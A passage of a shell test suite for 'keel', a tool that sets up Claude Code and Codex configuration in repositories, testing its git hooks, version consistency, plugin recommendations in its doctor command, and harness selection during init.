cat > "$storeshim3/python3" <<'SHIM'
#!/bin/sh
printf 'Python was not found; run without arguments to install from the Microsoft Store.\n'
exit 49
SHIM
chmod +x "$storeshim3/python3"

pc="$(fixture bare)"
( cd "$pc" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$pc" && "$KEEL" guard install >/dev/null 2>&1 )
( cd "$pc" && "$KEEL" profile set gates.commit_guard required >/dev/null 2>&1 )
pc_out="$( cd "$pc" && PATH="$storeshim3:$PATH" .git/hooks/pre-commit 2>&1 )"
case "$pc_out" in
  *"python3 is absent"*) ok "the pre-commit guard reports python3 as absent for a Store-alias shim, rather than silently skipping" ;;
  *) bad "commit guard" "a required gate went unchecked with no explanation printed. Got: $pc_out" ;;
esac
rm -rf "$pc" "$storeshim3"

( cd "$c" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ ! -e "$c/.git/hooks/pre-commit" ] && ok "guard uninstall removes the pre-commit hook too" \
  || bad "commit guard" "the pre-commit hook survived uninstall"
rm -rf "$c"

# --- guard install: prepare-commit-msg appends Keel-Version -----------------------------------
tv="$(fixture bare)"
( cd "$tv" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$tv" && "$KEEL" guard install >/dev/null 2>&1 )
[ -x "$tv/.git/hooks/prepare-commit-msg" ] && ok "guard install writes an executable prepare-commit-msg hook" \
  || bad "guard" "no executable .git/hooks/prepare-commit-msg"

( cd "$tv" && "$KEEL" guard status 2>&1 | grep -qi "message guard" ) \
  && ok "guard status reports the message guard as well as the push and commit guards" \
  || bad "guard" "status said nothing about the message guard"

( cd "$tv" && git add -A && git commit -q -m "a real commit" )
msg="$( cd "$tv" && git log -1 --format=%B )"
kv="$(sed -n 's/.*"keel_version": *"\([^"]*\)".*/\1/p' "$tv/.keel/profile.json" | head -1)"
case "$msg" in
  *"Keel-Version: $kv"*) ok "commit message carries the Keel-Version trailer" ;;
  *) bad "guard" "commit message has no 'Keel-Version: $kv' trailer. Got: $msg" ;;
esac

# amending does not duplicate the trailer. --no-edit, not -m: with -m git hands the hook a fresh
# message that has no trailer in it yet, so the duplicate guard is never reached and the assertion
# would pass against a hook with no guard at all. --no-edit feeds the previous message, trailer
# included, back through prepare-commit-msg, which is the case the guard exists for.
( cd "$tv" && git commit -q --amend --no-edit )
msg2="$( cd "$tv" && git log -1 --format=%B )"
count="$(printf '%s\n' "$msg2" | grep -c '^Keel-Version:')"
[ "$count" -eq 1 ] && ok "amending a commit does not duplicate the Keel-Version trailer" \
  || bad "guard" "expected exactly one Keel-Version trailer after amend, found $count"

# The hook body lives inside a quoted heredoc, so the repo's own lint reads it as a string and
# never parses it. Linting the generated file, the same pattern the existing pre-push and
# pre-commit shellcheck tests use, is the only way this code gets checked at all.
if command -v shellcheck >/dev/null 2>&1; then
    shellcheck -s bash "$tv/.git/hooks/prepare-commit-msg" >/dev/null 2>&1 \
      && ok "the generated prepare-commit-msg hook is shellcheck clean" \
      || bad "guard" "shellcheck flagged prepare-commit-msg: $(shellcheck -s bash "$tv/.git/hooks/prepare-commit-msg" 2>&1 | head -3)"
else
    printf '  SKIP  shellcheck is absent, so the generated prepare-commit-msg hook was not linted\n'
fi

( cd "$tv" && "$KEEL" guard uninstall >/dev/null 2>&1 )
[ ! -e "$tv/.git/hooks/prepare-commit-msg" ] && ok "guard uninstall removes the prepare-commit-msg hook too" \
  || bad "guard" "prepare-commit-msg survived uninstall"
rm -rf "$tv"

# ---- the two version numbers ----------------------------------------------
# VERSION drives the CLI and the value recorded in every project's profile. The version in
# .claude-plugin/plugin.json is what keys the installed plugin cache, so it is the one that decides
# whether an install picks a change up at all.
#
# They drifted once, silently: VERSION reached 0.3.0 with a whole feature behind it while
# plugin.json still said 0.2.0. Nothing failed. `keel version` was right, the CHANGELOG was right,
# and every install stayed on the previous skills, because the cache had already seen 0.2.0 and had
# no reason to fetch again. The symptom is a skill fix that reaches nobody and cannot be reproduced
# by its author, whose working tree is correct.
cli_version="$(cat "$ROOT/VERSION")"
# Every plugin manifest in the tree, not just Claude Code's. There are two since 2026-09-06, and a
# second one carrying a version is a second thing to drift: Codex keys its plugin cache the same
# way, so a Codex user would sit on the previous skills with nothing failing. Globbed rather than
# listed, so the third manifest is covered on the day it is added rather than the day it drifts.
for m in "$ROOT"/.*-plugin/plugin.json; do
    [ -f "$m" ] || continue
    plugin_version="$(sed -n 's/.*"version": "\(.*\)".*/\1/p' "$m" | head -1)"
    [ "$cli_version" = "$plugin_version" ] \
      && ok "VERSION and $(basename "$(dirname "$m")")/plugin.json agree ($cli_version)" \
      || bad "version drift" "VERSION is $cli_version, $(basename "$(dirname "$m")")/plugin.json is $plugin_version. The plugin cache is keyed on plugin.json, so installs stay on $plugin_version"
done

# The CHANGELOG's newest heading is the third copy of the number, and the one a human reads.
changelog_version="$(sed -n 's/^## \([0-9][0-9.]*\).*/\1/p' "$ROOT/CHANGELOG.md" | head -1)"
[ "$cli_version" = "$changelog_version" ] \
  && ok "CHANGELOG's newest entry matches VERSION ($cli_version)" \
  || bad "version drift" "VERSION is $cli_version, newest CHANGELOG entry is $changelog_version"

# The reference says which keys keel writes and which a human adds. That column is derived from a
# real init when the page is generated, and this is what stops it drifting afterwards. A
# hand-maintained list said twelve human-only keys until the context window work moved one, and
# nothing would have noticed.
c="$(fixture node-ts)"
( cd "$c" && "$KEEL" init -y >/dev/null 2>&1 )
drift="$(PAGE="$ROOT/docs/profile-keys.md" PROFILE="$c/.keel/profile.json" python3 -c "
import json, os, re
page = open(os.environ['PAGE']).read()
claimed = {}
for k, setby in re.findall(r'^\| \`([^\`]+)\` \| [^|]* \| ([^|]*) \|', page, re.M):
    claimed[k] = 'init' in setby
def leaves(o, p=''):
    s = set()
    if isinstance(o, dict):
        for k, v in o.items(): s |= leaves(v, f'{p}.{k}' if p else k)
    else: s.add(p)
    return s
actual = leaves(json.load(open(os.environ['PROFILE'])))
print(' '.join(sorted(k for k, says in claimed.items() if says != (k in actual))))
")"
[ -z "$drift" ] && ok "the reference's set-by column matches what keel init writes" \
  || bad "profile-keys" "the column disagrees with a real init for: $drift. Regenerate with tests/generate-profile-keys.sh"
rm -rf "$c"

# doctor has always been able to report a missing recommended plugin; it had nothing to check
# against. plugin_report reads plugins.recommended and falls back to a fixed three when it is
# absent, and init never wrote it, so no language server was ever named.
pr="$(fixture node-ts)"
( cd "$pr" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$pr/.keel/profile.json')).get('plugins',{}).get('recommended') or []
sys.exit(0 if 'typescript-lsp@claude-plugins-official' in r else 1)" \
  && ok "init records the language server for the detected stack" \
  || bad "plugins" "plugins.recommended does not name typescript-lsp"
rm -rf "$pr"

pg="$(fixture go)"
( cd "$pg" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$pg/.keel/profile.json')).get('plugins',{}).get('recommended') or []
sys.exit(0 if 'gopls-lsp@claude-plugins-official' in r else 1)" \
  && ok "a go project records gopls-lsp" \
  || bad "plugins" "plugins.recommended does not name gopls-lsp"
rm -rf "$pg"

# The case this whole half exists for. A repository that already has .claude/settings.json takes
# the merge path, which touches permissions and nothing else, so no plugin is enabled: not the
# language server, not keel@gbi. Until init wrote plugins.recommended, doctor could not see it.
pm="$(fixture node-ts)"
mkdir -p "$pm/.claude"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$pm/.claude/settings.json"
( cd "$pm" && "$KEEL" init -y >/dev/null 2>&1 )
# CLAUDE_CONFIG_DIR points at an empty directory so nothing is enabled at user scope. Without it
# this depends on the machine: a developer whose keel is enabled at user scope, which is how it is
# normally installed, would see doctor correctly stay quiet about keel@gbi and the assertion would
# fail for them and pass for everyone else.
mkdir -p "$pm/emptyconf"
out="$( cd "$pm" && CLAUDE_CONFIG_DIR="$pm/emptyconf" HOME="$pm" "$KEEL" doctor 2>&1 )"
case "$out" in *typescript-lsp*) ok "doctor names the missing language server on a mature repo" ;;
  *) bad "plugins" "doctor did not name typescript-lsp as missing" ;; esac
case "$out" in *keel@gbi*) ok "doctor names keel@gbi as not enabled when it is enabled nowhere" ;;
  *) bad "plugins" "doctor did not name keel@gbi as missing" ;; esac
case "$out" in *"/plugin install"*) ok "doctor names the command that installs it" ;;
  *) bad "plugins" "doctor reported a missing plugin without saying how to install it" ;; esac
rm -rf "$pm"

# A fresh repository has them enabled already, so it must stay quiet. A warning that fires on a
# healthy project is one people learn to scroll past.
pf="$(fixture node-ts)"
( cd "$pf" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$pf" && "$KEEL" doctor 2>&1 )"
case "$out" in *"recommended plugin not enabled"*) bad "plugins" "doctor warned on a fresh repo where init enabled everything" ;;
  *) ok "a fresh repository is not warned about plugins" ;; esac
rm -rf "$pf"

# Two deliberate non-behaviours, which are the kind most easily lost to a later helpful change.
ps="$(fixture node-ts)"
mkdir -p "$ps/.claude"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$ps/.claude/settings.json"
( cd "$ps" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
s=json.load(open('$ps/.claude/settings.json'))
sys.exit(0 if 'enabledPlugins' not in s else 1)" \
  && ok "init adds no plugin entries to an existing settings file" \
  || bad "settings" "init wrote enabledPlugins into a file the project already had"

# The same path must still add the guardrails, which is the one thing it is for.
python3 -c "
import json,sys
p=json.load(open('$ps/.claude/settings.json')).get('permissions',{})
sys.exit(0 if p.get('deny') else 1)" \
  && ok "init still merges the permission guardrails into an existing settings file" \
  || bad "settings" "the permission merge stopped happening"

# A curated plugins.recommended is a human value and merge_profile must keep it.
python3 - "$ps" <<'PY5'
import json,sys,pathlib
p=pathlib.Path(sys.argv[1])/".keel/profile.json"; d=json.loads(p.read_text())
d["plugins"]["recommended"]=["context7@claude-plugins-official"]
p.write_text(json.dumps(d,indent=2)+"\n")
PY5
( cd "$ps" && "$KEEL" init -y >/dev/null 2>&1 )
python3 -c "
import json,sys
r=json.load(open('$ps/.keel/profile.json'))['plugins']['recommended']
sys.exit(0 if r==['context7@claude-plugins-official'] else 1)" \
  && ok "a hand-edited plugins.recommended survives re-initialisation" \
  || bad "plugins" "re-init overwrote a curated plugin list"
rm -rf "$ps"

# A plugin enabled at user scope is enabled. plugin_report read only the project settings file,
# which was harmless while its fallback list was three plugins nobody enables per project. Once init
# wrote keel@gbi into plugins.recommended, every project whose keel is enabled at user scope, which
# is how it is normally installed, got a permanent warning that it was missing, alongside doctor's
# own line saying the marketplace is registered. The remedy it printed did not help either:
# /plugin install writes user scope, which is the scope this never read.
pu="$(fixture node-ts)"
mkdir -p "$pu/.claude" "$pu/userconf"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$pu/.claude/settings.json"
printf '{ "enabledPlugins": { "keel@gbi": true } }\n' > "$pu/userconf/settings.json"
( cd "$pu" && "$KEEL" init -y >/dev/null 2>&1 )
out="$( cd "$pu" && CLAUDE_CONFIG_DIR="$pu/userconf" HOME="$pu" "$KEEL" doctor 2>&1 )"
case "$out" in *"not enabled: keel@gbi"*) bad "plugin scope" "doctor called keel@gbi missing while it is enabled at user scope" ;;
  *) ok "a plugin enabled at user scope is not reported missing" ;; esac
# And one that really is missing everywhere is still reported, so the fix does not silence the check.
case "$out" in *"not enabled: typescript-lsp"*) ok "a plugin missing from every scope is still reported" ;;
  *) bad "plugin scope" "the scope fix silenced a genuinely missing plugin" ;; esac
rm -rf "$pu"

# plugins.excluded was declared so a project had somewhere to record the decision, and nothing
# honoured it, so a plugin a team had deliberately rejected was recommended to them on every
# doctor run. The recommended list wins nothing here: excluded is the later decision.
#
# THE FIXTURE HAS TO TAKE THE MERGE PATH. On a fresh node-ts fixture `keel init` writes
# .claude/settings.json with typescript-lsp and the rest already enabled, so plugin_report has
# nothing to report and both cases below would pass while asserting nothing. Writing a settings
# file first takes the merge path, which touches permissions only and enables no plugin, which is
# what the existing `pm` merge-path case in this file already exists to set up.
#
# CLAUDE_CONFIG_DIR and HOME are not optional. The `pu` user-scope case in this file records why: a
# developer whose plugins are enabled at user scope, which is how keel is normally installed,
# would see doctor correctly stay quiet and the assertion would fail for them alone.
px="$(fixture node-ts)"
mkdir -p "$px/.claude" "$px/emptyconf"
printf '{\n  "permissions": { "allow": ["Bash(ls:*)"] }\n}\n' > "$px/.claude/settings.json"
( cd "$px" && "$KEEL" init -y >/dev/null 2>&1 )
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["context7@claude-plugins-official",
                                "claude-md-management@claude-plugins-official"],
                "excluded": ["context7@claude-plugins-official"]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *context7@claude-plugins-official*)
    bad "an excluded plugin is not recommended" "$out" ;;
  *) ok "an excluded plugin is not recommended" ;;
esac
# The floor for this pair. Without it, a plugin_report that reported nothing at all would pass the
# case above, and reporting nothing is exactly what a broken settings read looks like.
#
# The companion is claude-md-management and NOT code-review, deliberately. code-review is one of
# the three hardcoded names the fallback list carries, so it is reported even when the profile read
# throws and the fallback substitutes: the assertion would pass while proving nothing about the
# project's own list. That matters more since excluded parsing moved inside the same try. Any name
# in expected_plugins that is not one of security-guidance, code-review or skill-creator works.
case "$out" in *claude-md-management@claude-plugins-official*)
    ok "a recommended plugin beside it is still reported" ;;
  *) bad "a recommended plugin beside it is still reported" "$out" ;;
esac

( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"]["excluded"] = []
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *context7@claude-plugins-official*)
    ok "the same plugin is reported when the exclusion is removed" ;;
  *) bad "the same plugin is reported when the exclusion is removed" "$out" ;;
esac

# The ordering case, and it is the only one that fails if the subtraction moves ahead of the
# fallback. Every case above excludes one of two recommended plugins, so `rec` never empties and
# the ordering is never exercised: a review proved by mutation that moving the subtraction before
# the fallback survives all three. Here the project excludes everything it recommends, so a
# subtraction that ran first would empty `rec`, hit `if not rec`, and hand back the hardcoded
# three, which is the exact opposite of what the project asked for.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["context7@claude-plugins-official"],
                "excluded": ["context7@claude-plugins-official"]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in
  *security-guidance@claude-plugins-official*|*skill-creator@claude-plugins-official*)
    bad "excluding every recommended plugin does not resurrect the fallback list" "$out" ;;
  *) ok "excluding every recommended plugin does not resurrect the fallback list" ;;
esac

# keel itself is not excludable, and this pins it. Every other plugin warning says a skill degrades
# to an inline fallback; the keel@ branch says no keel skill loads at all, which is not the same
# kind of advice. A project that listed keel@gbi under excluded would otherwise switch off the one
# warning here that is not about degradation. Decided by Bernard on 2026-09-08.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["keel@gbi"], "excluded": ["keel@gbi"]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *"keel itself is not enabled here"*)
    ok "excluding keel@gbi does not silence the warning that keel is not loaded" ;;
  *) bad "excluding keel@gbi does not silence the warning that keel is not loaded" "$out" ;;
esac

# The type guard, which is the one property the implementation states in prose and nothing else
# pins. A review ran five mutations against the five cases above and every one died; a sixth,
# computing exc as set(_x or []) back inside the try, survived all of them. With a non-list
# excluded that mutation raises a TypeError into an except sized for "the profile does not load",
# discards the recommended list this project wrote, and reports against the hardcoded three
# instead. Asserting security-guidance is ABSENT is what catches it: that name can only appear via
# the fallback, never via the list set here.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["context7@claude-plugins-official",
                                "claude-md-management@claude-plugins-official"],
                "excluded": 5}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
# Three arms, and the third is not decoration. Asserting only that the fallback name is absent
# passes vacuously when the whole block dies and doctor prints no plugin line at all, which is one
# of the two failure modes a malformed excluded can cause. A mutation proved that; the case has to
# see the list this project wrote, not merely fail to see the hardcoded one.
case "$out" in
  *security-guidance@claude-plugins-official*)
    bad "a malformed excluded is ignored, not treated as a failed profile read" "$out" ;;
  *claude-md-management@claude-plugins-official*)
    ok "a malformed excluded is ignored, not treated as a failed profile read" ;;
  *) bad "a malformed excluded is ignored, not treated as a failed profile read" "$out" ;;
esac

# The element check, which is a failure this change would otherwise introduce rather than inherit.
# A non-string element raises out of set() past the whole block, so SETTINGS_REPORT comes back
# empty and the conflict and duplicate reports die with this one. Before this change nothing read
# excluded, so the same profile was harmless. Asserting a recommended plugin IS still named is what
# catches it, because the symptom is silence rather than a wrong line.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": ["claude-md-management@claude-plugins-official"],
                "excluded": [{"name": "context7@claude-plugins-official"}]}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *claude-md-management@claude-plugins-official*)
    ok "a non-string element in excluded does not silence the whole plugin report" ;;
  *) bad "a non-string element in excluded does not silence the whole plugin report" "$out" ;;
esac

# recommended gets the same treatment, and this case is why the check covers both fields. A string
# is truthy, so it skips the fallback and the loop walks it character by character: a recommended
# of "abc" produced three warnings naming plugins a, b and c, each with an install command for a
# plugin that cannot exist. Measured 2026-09-08. An int raised instead and killed every report.
( cd "$px" && python3 - <<'PY'
import json
p = ".keel/profile.json"
d = json.load(open(p))
d["plugins"] = {"recommended": "context7@claude-plugins-official", "excluded": []}
json.dump(d, open(p, "w"), indent=2)
PY
)
out="$( cd "$px" && CLAUDE_CONFIG_DIR="$px/emptyconf" HOME="$px" "$KEEL" doctor 2>&1 )"
case "$out" in *"not enabled: c."*|*"not enabled: o."*|*"not enabled: n."*)
    bad "a string recommended is not walked character by character" "$out" ;;
  *) ok "a string recommended is not walked character by character" ;;
esac
rm -rf "$px"

rm -rf "$FIXTURE_CACHE"

# ---- the harness contract --------------------------------------------------
#
# R-01. The refactor may not change one byte of what a Claude Code user gets.
#
# The baseline is GENERATED from the pre-refactor commit, not committed as a fixture. Lines 1 to 3
# of this file state the policy the suite runs on: fixtures are generated per case rather than
# committed, so they cannot go stale against the code they exercise. A committed baseline of init
# output is exactly the fixture that policy forbids.
#
# KEEL_BASELINE_REF names the commit to compare against. Unset, it defaults to HEAD, which makes
# this a no-op comparison of the tree against itself: green, and proving nothing. That is why the
# refactor's hand-over records the SHA, and why this prints which ref it used rather than leaving a
# reader to guess whether the case meant anything.
BASELINE_REF="${KEEL_BASELINE_REF:-HEAD}"
base="$(mktemp -d)"; after="$(mktemp -d)"
if git -C "$ROOT" worktree add -q --detach "$base/repo" "$BASELINE_REF" 2>/dev/null; then
    ( cd "$base" && git init -q -b main . && "$base/repo/bin/keel" init -y > "$base/init.txt" 2>&1 )
    ( cd "$after" && git init -q -b main . && "$ROOT/bin/keel" init -y > "$after/init.txt" 2>&1 )
    # init's own stdout is compared too, with the fixture's directory name normalised out: that is
    # the only line that legitimately differs between two runs in two temp directories. Without it
    # the summary block is uncovered, and the refactor changed "CLAUDE.md, AGENTS.md" to
    # "CLAUDE.md AGENTS.md" with nothing noticing. Found in review of this task's own work.
    sed -E 's/configured .*/configured FIXTURE/' "$base/init.txt" > "$base/init.norm"
    sed -E 's/configured .*/configured FIXTURE/' "$after/init.txt" > "$after/init.norm"
    if diff -q "$base/init.norm" "$after/init.norm" >/dev/null 2>&1; then
        ok "init output unchanged against $BASELINE_REF: what it prints"
    else
        bad "init output unchanged against $BASELINE_REF: what it prints" \
          "$(diff "$base/init.norm" "$after/init.norm" 2>&1 | head -4 | tr '\n' ' ')"
    fi

    for f in .claude/settings.json .claude/settings.local.json CLAUDE.md AGENTS.md; do
        if diff -q "$base/$f" "$after/$f" >/dev/null 2>&1; then
            ok "init output unchanged against $BASELINE_REF: $f"
        else
            bad "init output unchanged against $BASELINE_REF: $f" \
              "$(diff "$base/$f" "$after/$f" 2>&1 | head -3 | tr '\n' ' ')"
        fi
    done

    # Doctor too, and this is the half the task's own step 1 leaves uncovered. The writers are one
    # part of the refactor; the other is that cmd_doctor's Claude Code checks move behind
    # harness_doctor_findings, and nothing above would notice those changing what a person reads.
    # Doctor's output is deterministic run to run in a fixture, checked before this was written.
    #
    # The schema version NUMBER is normalised out of both sides, and only the number. Task 8 bumps
    # SCHEMA_VERSION to 3 on purpose, so that one line differs from every pre-task-8 baseline for
    # the rest of the project's life, and a comparison that failed on it would be switched off
    # within a week. The line's wording and its level are still compared, and the number itself has
    # its own assertion further down, where a bump is the thing being tested rather than noise.
    #
    # The harness section is dropped from BOTH sides, and only that section. It is output the
    # refactor did not move: it did not exist until the doctor task added it, so a comparison that
    # included it would be red for the whole of that task and green again the moment it was
    # committed, which is a comparison that reports when somebody last committed rather than what
    # changed. Every line the filter drops carries its own assertion in this file. The alternatives
    # are anchored and name one line each, because a pattern loose enough to swallow a neighbouring
    # check would silence exactly what this comparison exists to catch.
    #
    # The closing tally goes with it, for the same reason and no other: it is the sum of the lines
    # above, so filtering a section out of the comparison and leaving its contribution in the total
    # would fail on arithmetic that is correct. That total has its own case, "doctor's summary
    # counts its warnings", which counts the WARN lines and compares.
    HSECTION='^(ok    running under |WARN  cannot determine which harness is running|ok    [a-z]+ gates active:|WARN  [a-z]+ will run none of keel|WARN  [a-z]+ gates the manifest grants:|WARN  [a-z]+ does not get |WARN  this repository declares hard_block_paths|WARN  codex is installed on this machine|keel doctor: )'
    ( cd "$base" && "$base/repo/bin/keel" doctor 2>&1 \
        | sed -E 's/schema version [0-9]+/schema version N/g' | grep -vE "$HSECTION" > "$base/doctor.txt" )
    ( cd "$after" && "$ROOT/bin/keel" doctor 2>&1 \
        | sed -E 's/schema version [0-9]+/schema version N/g' | grep -vE "$HSECTION" > "$after/doctor.txt" )
    if diff -q "$base/doctor.txt" "$after/doctor.txt" >/dev/null 2>&1; then
        ok "doctor output unchanged against $BASELINE_REF"
    else
        bad "doctor output unchanged against $BASELINE_REF" \
          "$(diff "$base/doctor.txt" "$after/doctor.txt" 2>&1 | head -4 | tr '\n' ' ')"
    fi
    git -C "$ROOT" worktree remove --force "$base/repo" 2>/dev/null
else
    bad "a baseline worktree at $BASELINE_REF" "git worktree add failed; the R-01 comparison did not run"
fi
rm -rf "$base" "$after"

# The neutral code names no harness OUTSIDE A COMMENT.
#
# `grep -n ... | grep -v '^ *#'` does not do that: grep -n prefixes every line with NNN:, so the
# comment filter matches nothing and the check demands bin/keel stop mentioning .claude even in
# prose. Measured: 50 hits before that filter and 50 after. Strip the prefix before filtering.
leak="$(grep -nE '\.claude|CLAUDE\.md|enabledPlugins|known_marketplaces' "$KEEL" \
        | sed 's/^[0-9]*://' | grep -vE '^[[:space:]]*#' | head -3)"
[ -z "$leak" ] && ok "bin/keel names no harness outside lib/harness/ and its comments" \
  || bad "bin/keel names no harness outside lib/harness/ and its comments" "$leak"

# The contract is complete, and it is checked by name rather than by whether init happened to work.
# A harness file missing one function fails at the call site, in a message about an undefined
# command, on somebody's machine. Here it is a red build with the function's name in it.
for fn in harness_write_config harness_write_local_config harness_permission_rules \
          harness_recommend_plugins harness_config_paths harness_doctor_findings; do
    grep -qE "^${fn}\(\)" "$ROOT/lib/harness/claude.sh" 2>/dev/null \
      && ok "claude.sh implements $fn" || bad "claude.sh implements $fn" "not defined"
done

# ---- which harnesses a repository serves ------------------------------------

h_case() {  # h_case <setup command> <init flag> <expected harnesses json>
    local setup="$1" flag="$2" want="$3" w got
    # $flag is deliberately split: it is empty in most cases and "--harness codex" in others.
    # Quoting it would pass one empty argument or one two-word one, and both break init.
    w="$(mktemp -d)"
    # A repository-local git identity, because two of the setups below commit. Without one, a
    # machine with no global user.name fails the commit, the `&&` chain aborts before `keel init`
    # runs, and the case reports an empty `got` for a profile that was never written. That is how
    # CI went red on 2026-09-07 on cases every laptop passed: the blank value was a missing file,
    # not a wrong answer. tests/run-tests.sh removes the ambient identity so this cannot recur
    # unseen.
    # shellcheck disable=SC2086
    ( cd "$w" && git init -q -b main . && git config user.email t@t.t && git config user.name t \
        && eval "$setup" \
        && "$ROOT/bin/keel" init $flag -y >/dev/null 2>&1 )
    got="$(python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1])).get("harnesses")))' "$w/.keel/profile.json" 2>/dev/null)"
    [ "$got" = "$want" ] && ok "harnesses $want ($setup $flag)" \
      || bad "harnesses $want ($setup $flag)" "got $got"
    rm -rf "$w"
}

h_case "true"                                             ""                       '["claude"]'
h_case "true"                                             "--harness codex"        '["codex"]'
h_case "true"                                             "--harness claude,codex" '["claude", "codex"]'
h_case "mkdir -p .codex && echo x > .codex/config.toml && git add -A && git commit -qm x" "" '["claude", "codex"]'
h_case "mkdir -p .codex && echo x > .codex/config.toml"    ""                      '["claude"]'
h_case "echo x > AGENTS.md && git add -A && git commit -qm x" ""                   '["claude"]'

# Upgrading an existing schema 2 profile must not infer a harness from anything. An installed base
# that has been dual writing AGENTS.md since long before Codex was supported would otherwise be
# marked Codex-serving in one upgrade, and every one of those repositories would start claiming a
# tier nobody chose for it.
w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
python3 - "$w/.keel/profile.json" <<'DOWNGRADE'
import json,sys
p=sys.argv[1]; d=json.load(open(p)); d["schema_version"]=2; d.pop("harnesses",None)
json.dump(d, open(p,"w"), indent=2)
DOWNGRADE
( cd "$w" && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
got="$(python3 -c 'import json,sys;d=json.load(open(sys.argv[1]));print(d.get("schema_version"), json.dumps(d.get("harnesses")))' "$w/.keel/profile.json")"
# The schema number is read from bin/keel and not typed. This case tests which harnesses an upgrade
# infers, not what the schema version is, and a literal here made every schema bump edit a case
# that has nothing to do with it (it said 5 until docs/plans/2026-10-16-manage-test-speed.md moved
# the version to 6). "init writes schema version" above is where the number is pinned.
sv_now="$(sed -n 's/^SCHEMA_VERSION=\([0-9][0-9]*\)$/\1/p' "$ROOT/bin/keel")"
[ "$got" = "$sv_now"' ["claude"]' ] && ok "a schema 2 profile upgrades to claude only" \
  || bad "a schema 2 profile upgrades to claude only" "got $got, want $sv_now"
rm -rf "$w"

# An explicit --harness must win on a repository that ALREADY has a profile, and until this was
# found in review it silently lost. merge_profile defends every human value in the profile, which is
# right for a set somebody edited by hand and wrong for the flag that exists to change it: the only
# ways to move the set were --force, which discards every human value in the file, and hand-editing.
w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init -y >/dev/null 2>&1 \
    && "$ROOT/bin/keel" init --harness codex -y >/dev/null 2>&1 )
got="$(python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1])).get("harnesses")))' "$w/.keel/profile.json" 2>/dev/null)"
[ "$got" = '["codex"]' ] && ok "--harness wins over an existing profile" \
  || bad "--harness wins over an existing profile" "got $got"

# ...and a plain re-init does NOT re-infer it, which is the behaviour the merge is there to protect.
( cd "$w" && "$ROOT/bin/keel" init -y >/dev/null 2>&1 )
got="$(python3 -c 'import json,sys;print(json.dumps(json.load(open(sys.argv[1])).get("harnesses")))' "$w/.keel/profile.json" 2>/dev/null)"
[ "$got" = '["codex"]' ] && ok "a plain re-init leaves the harness set alone" \
  || bad "a plain re-init leaves the harness set alone" "got $got"
rm -rf "$w"

# --harness takes a value, and an unvalidated one ate the next flag: the profile recorded a harness
# called "--team", --team never ran, nothing was staged, and init reported success.
w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness --team -y >/dev/null 2>&1 )
[ -f "$w/.keel/profile.json" ] && bad "--harness refuses to swallow the next flag" "init wrote a profile" \
  || ok "--harness refuses to swallow the next flag"
rm -rf "$w"

w="$(mktemp -d)"
( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness bogus -y >/dev/null 2>&1 )
[ -f "$w/.keel/profile.json" ] && bad "an unknown harness id is refused" "init wrote a profile" \
  || ok "an unknown harness id is refused"
rm -rf "$w"

# R-01: init still prompts for nothing.
w="$(mktemp -d)"
if ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init -y </dev/null >/dev/null 2>&1 ); then
    ok "init completes with no tty and no prompt"
else
    bad "init completes with no tty and no prompt" "non-zero exit"
fi
rm -rf "$w"

# ---- a repository that serves Codex -----------------------------------------

w="$(mktemp -d)"; ( cd "$w" && git init -q -b main . && "$ROOT/bin/keel" init --harness codex -y >"$w/init.txt" 2>&1 )

[ -f "$w/.codex/config.toml" ] && ok "codex config written" || bad "codex config written" "absent"
[ -f "$w/.claude/settings.json" ] && bad "no Claude settings for a codex-only repo" "written" \
  || ok "no Claude settings for a codex-only repo"
grep -q 'keel:start' "$w/AGENTS.md" 2>/dev/null && ok "AGENTS.md carries the managed block" \
  || bad "AGENTS.md carries the managed block" "absent"
